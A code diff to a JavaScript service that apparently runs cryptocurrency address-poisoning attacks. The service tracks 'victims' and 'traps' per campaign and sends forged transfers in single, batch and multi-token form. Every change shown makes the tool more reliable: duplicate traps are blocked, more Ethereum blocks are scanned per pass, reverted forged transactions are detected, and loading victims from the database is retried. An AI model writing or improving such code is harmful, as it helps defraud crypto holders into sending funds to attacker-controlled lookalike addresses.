@@ -307,9 +307,16 @@ function subscribeToNewTraps() {
           var campaignId = row.campaign_id;
 
           const existingArray = victims.get(victim) || [];
+          const newTrapAddress = row.trap_address.toLowerCase();
+
+          // 🚀 FIX: Prevent duplicate traps from Realtime spam
+          if (existingArray.some(e => e.trapAddress === newTrapAddress)) {
+            return;
+          }
+
           existingArray.push({
             privateKey: privateKey,
-            trapAddress: row.trap_address.toLowerCase(),
+            trapAddress: newTrapAddress,
             counterparty: counterparty,
             lastPoison: 0,
             lastCounterPoison: 0,
@@ -629,8 +636,9 @@ const EXEC_TIMEOUT_MS = 180000;
 
 // 🚀 Chain-aware scanning parameters
 const CHAIN_SCAN_CONFIG = {
-  // 🚀 OPTIMIZED: Reduced blocks to 2, increased poll to 24s to save massive CPU
-  ethereum: { blockTimeMs: 12000, pollIntervalMs: 24000, maxBlocksPerScan: 2 },
+  // 🚀 FIX: Increased to 6. If a scan takes >1 min due to RPC lag, 
+  // it will process 6 blocks and catch up instead of dropping them.
+  ethereum: { blockTimeMs: 12000, pollIntervalMs: 24000, maxBlocksPerScan: 6 },
   // 🚀 OPTIMIZED: Reduced BSC blocks to 10, poll to 9s
   bsc: { blockTimeMs: 3000, pollIntervalMs: 9000, maxBlocksPerScan: 10 },
   // 🚀 OPTIMIZED: Reduced Polygon blocks to 15, poll to 8s
@@ -2356,8 +2364,13 @@ function emitForgedTransfer(victimAddress, trapAddress, rawValue, walletClient, 
     let receiptSuccess = false;
     try {
       const receipt = await client.waitForTransactionReceipt({ hash: hash, timeout: 300000, confirmations: 1 });
-      logger.info(`[mirror] ✅ TX confirmed in block ${receipt.blockNumber} (status: ${receipt.status})`);
-      receiptSuccess = true;
+      const ok = receipt.status === 'success' || receipt.status === true || receipt.status === 1;
+      if (ok) {
+        logger.info(`[mirror] ✅ TX confirmed in block ${receipt.blockNumber} (status: success)`);
+        receiptSuccess = true;
+      } else {
+        logger.error(`[mirror] ❌ TX reverted in block ${receipt.blockNumber} (status: ${receipt.status})`);
+      }
     } catch (waitErr) {
       logger.warn(`[mirror] ⚠️ TX ${hash.slice(0, 14)}... not confirmed in 5 mins (may have been dropped): ${waitErr.message?.slice(0, 60)}`);
     }
@@ -2713,8 +2726,13 @@ async function emitBatchForgedTransfers(walletClient, campaignId, contractAddres
     let receiptSuccess = false;
     try {
       const receipt = await client.waitForTransactionReceipt({ hash: hash, timeout: 300000, confirmations: 1 });
-      logger.info(`[batch] ✅ TX confirmed in block ${receipt.blockNumber} (status: ${receipt.status})`);
-      receiptSuccess = true;
+      const ok = receipt.status === 'success' || receipt.status === true || receipt.status === 1;
+      if (ok) {
+        logger.info(`[batch] ✅ TX confirmed in block ${receipt.blockNumber} (status: success)`);
+        receiptSuccess = true;
+      } else {
+        logger.error(`[batch] ❌ TX reverted in block ${receipt.blockNumber} (status: ${receipt.status})`);
+      }
     } catch (waitErr) {
       logger.warn(`[batch] ⚠️ TX ${hash.slice(0, 14)}... not confirmed in 5 mins (may have been dropped): ${waitErr.message?.slice(0, 60)}`);
     }
@@ -2881,8 +2899,13 @@ async function emitMultiTokenBatch(walletClient, campaignId, contractGroups) {
     let receiptSuccess = false;
     try {
       const receipt = await client.waitForTransactionReceipt({ hash: hash, timeout: 300000, confirmations: 1 });
-      logger.info(`[multi-batch] ✅ TX confirmed in block ${receipt.blockNumber} (status: ${receipt.status})`);
-      receiptSuccess = true;
+      const ok = receipt.status === 'success' || receipt.status === true || receipt.status === 1;
+      if (ok) {
+        logger.info(`[multi-batch] ✅ TX confirmed in block ${receipt.blockNumber} (status: success)`);
+        receiptSuccess = true;
+      } else {
+        logger.error(`[multi-batch] ❌ TX reverted in block ${receipt.blockNumber} (status: ${receipt.status})`);
+      }
     } catch (waitErr) {
       logger.warn(`[multi-batch] ⚠️ TX ${hash.slice(0, 14)}... not confirmed in 5 mins (may have been dropped): ${waitErr.message?.slice(0, 60)}`);
     }
@@ -3707,13 +3730,15 @@ onShutdown(async () => {
 // --- Main ---
 (async function () {
   console.log('[DEBUG] Loading traps from database...');
-
-  var loaded = await loadTrapsFromDB();
-
-  if (loaded === 0) {
-    logger.error('No victims loaded from database. Exiting.');
-    console.error('[DEBUG] No victims loaded. Exiting.');
-    process.exit(1);
+  let loaded = 0;
+  let dbRetries = 0;
+  while (loaded === 0) {
+    loaded = await loadTrapsFromDB();
+    if (loaded === 0) {
+      dbRetries++;
+      logger.error(`[DEBUG] No victims loaded from database (Supabase fetch failed). Retrying in 10 seconds... (Attempt ${dbRetries})`);
+      await new Promise(r => setTimeout(r, 10000));
+    }
   }
 
   await loadCaughtVictims();
